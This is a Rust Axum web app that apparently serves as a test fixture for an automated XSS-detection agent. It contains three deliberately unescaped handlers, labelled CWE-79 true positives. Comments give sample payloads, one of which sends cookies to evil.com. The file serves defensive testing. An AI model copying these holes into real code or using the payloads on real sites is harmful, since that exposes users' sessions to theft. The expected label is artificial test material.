// --- screw-agents smoke-test fixture (not for detection benchmarking) ---
// Per ADR-014 (docs/DECISIONS.md), Rust benchmark corpus is DEFERRED to Phase 4.
// This file verifies MCP plumbing + tree-sitter loading + agent-YAML resolution.
// Detection accuracy against this file is NOT part of any Phase 1 validation gate.
// Phase 4 corpus seed: docs/research/benchmark-tier4-rust-modern.md
// -----------------------------------------------------------------------
// Fixture: rust-axum-html-format — Axum Html(format!("<h1>{}</h1>", user_input))
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-79
// Agent: xss
// Pattern: User input interpolated via format!() into Html() response — the primary Rust XSS vector

use axum::{
    extract::{Path, Query},
    response::Html,
    routing::{get, post},
    Form, Router,
};
use serde::Deserialize;

#[derive(Deserialize)]
struct SearchParams {
    q: Option<String>,
    page: Option<u32>,
}

// VULNERABLE: format!() interpolates user input into HTML string wrapped in Html()
// axum::response::Html sets Content-Type: text/html but performs no escaping
// Attacker sends: GET /search?q=<script>alert(document.cookie)</script>
async fn search_handler(Query(params): Query<SearchParams>) -> Html<String> {
    let query = params.q.unwrap_or_default();
    let page = params.page.unwrap_or(1);

    // VULNERABLE: user-controlled query directly interpolated into HTML
    Html(format!(
        r#"<!DOCTYPE html>
<html>
<body>
    <h1>Search Results</h1>
    <p>Showing results for: {}</p>
    <p>Page: {}</p>
    <ul>
        <li>Result 1 matching '{}'</li>
        <li>Result 2 matching '{}'</li>
    </ul>
</body>
</html>"#,
        query, page, query, query
    ))
}

// VULNERABLE: path parameter reflected in HTML response
// Attacker sends: GET /user/<img src=x onerror=alert(1)>
async fn profile_handler(Path(username): Path<String>) -> Html<String> {
    // VULNERABLE: username from URL path directly in format!() HTML
    Html(format!(
        "<html><body>\
         <h1>Profile: {}</h1>\
         <p>Welcome back, {}!</p>\
         </body></html>",
        username, username
    ))
}

#[derive(Deserialize)]
struct ContactForm {
    name: String,
    email: String,
    message: String,
}

// VULNERABLE: form submission data reflected in confirmation page
// Attacker submits: message=<svg/onload=fetch('https://evil.com/'+document.cookie)>
async fn contact_handler(Form(form): Form<ContactForm>) -> Html<String> {
    // VULNERABLE: all form fields interpolated into HTML without encoding
    Html(format!(
        r#"<html><body>
        <h2>Thank you, {}!</h2>
        <p>We received your message:</p>
        <blockquote>{}</blockquote>
        <p>We'll reply to: {}</p>
        </body></html>"#,
        form.name, form.message, form.email
    ))
}

#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/search", get(search_handler))
        .route("/user/{username}", get(profile_handler))
        .route("/contact", post(contact_handler));

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
